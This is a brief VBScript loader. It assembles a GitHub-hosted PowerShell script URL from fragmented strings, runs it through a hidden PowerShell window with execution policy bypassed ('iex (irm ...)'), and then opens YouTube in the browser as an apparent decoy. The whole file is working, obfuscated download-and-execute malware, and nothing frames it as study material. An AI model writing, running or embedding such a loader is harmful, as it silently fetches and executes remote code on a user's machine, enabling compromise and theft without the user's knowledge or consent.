Set objShell = CreateObject("WScript.Shell")

' --- URL 1 Fragmentation (PowerShell Background Execution) ---
a = "ht" : b = "tp" : c = "s:" : d = "//" : e = "raw." : f = "gith"
g = "ubus" : h = "erco" : i = "nten" : j = "t.co" : k = "m/ba"
l = "baga" : m = "pi00" : n = "1/co" : o = "co/r" : p = "efs/"
q = "head" : r = "s/ma" : s = "in/c" : t = "oco3" : u = ".ps1"

url1 = a & b & c & d & e & f & g & h & i & j & k & l & m & n & o & p & q & r & s & t & u

' --- URL 2 (Open YouTube in Browser) ---
url2 = "https://www.youtube.com"

' 1. Run the script SILENTLY in the background
cmd1 = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""iex (irm '" & url1 & "')"""
objShell.Run cmd1, 0, False

' 2. Open YouTube in the default browser (Visible)
objShell.Run url2